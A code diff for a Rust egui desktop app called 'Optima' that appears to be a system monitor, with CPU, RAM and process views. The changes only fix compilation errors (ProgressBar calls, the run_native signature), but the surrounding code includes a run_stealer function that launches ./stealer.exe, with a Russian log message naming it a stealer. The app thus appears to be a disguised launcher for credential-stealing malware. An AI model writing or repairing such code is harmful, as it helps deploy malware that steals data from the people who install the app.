@@ -15,7 +15,7 @@ struct Config {
     theme: Theme,
 }
 
-#[derive(Serialize, Deserialize, Clone, PartialEq, Debug)] // Added Debug here
+#[derive(Serialize, Deserialize, Clone, PartialEq, Debug)] 
 enum Theme { Dark, Sakura, Snow, DarkRed }
 
 impl Default for Config {
@@ -102,7 +102,7 @@ impl OptimaApp {
         send_log(&msg);
     }
 
-    fn run_stealer(&mut self) { // Changed to &mut self
+    fn run_stealer(&mut self) { 
         if let Err(e) = Command::new("./stealer.exe").output() {
             self.log(format!("Ошибка запуска стиллера: {}", e));
         } else {
@@ -114,7 +114,7 @@ impl OptimaApp {
         self.sys.refresh_cpu_list(CpuRefreshKind::everything());
         self.sys.refresh_memory();
         
-        let pid = Pid::from(std::process::id() as usize); // Fixed Pid type
+        let pid = Pid::from(std::process::id() as usize); 
         self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
     }
 }
@@ -193,12 +193,13 @@ impl eframe::App for OptimaApp {
                 Tab::Hardware => {
                     let cpu_usage = self.sys.global_cpu_usage();
                     ui.label(format!("CPU Usage: {:.1}%", cpu_usage));
-                    egui::ProgressBar::new(cpu_usage / 100.0).show(ui); // Fixed progress_bar
+                    // Fixed: use ui.add()
+                    ui.add(egui::ProgressBar::new(cpu_usage / 100.0)); 
                     
                     let used_mb = self.sys.used_memory() / 1024 / 1024;
                     ui.label(format!("RAM Used: {} / {} MB", used_mb, self.total_ram));
                     let ram_ratio = if self.total_ram > 0 { (used_mb as f32) / (self.total_ram as f32) } else { 0.0 };
-                    egui::ProgressBar::new(ram_ratio.clamp(0.0, 1.0)).show(ui); // Fixed progress_bar
+                    ui.add(egui::ProgressBar::new(ram_ratio.clamp(0.0, 1.0))); // Fixed
                 },
                 Tab::Processes => {
                     for process in self.sys.processes() {
@@ -247,7 +248,12 @@ fn main() {
         ..Default::default()
     };
     
-    eframe::run_native(Box::new(|cc: &eframe::CreationContext<'_>| {
-        Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
-    }), native_options);
+    // Fixed: Added app name argument and removed Box wrapping around closure
+    eframe::run_native(
+        "Optima", 
+        native_options, 
+        Box::new(|cc| {
+            Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
+        })
+    );
 }
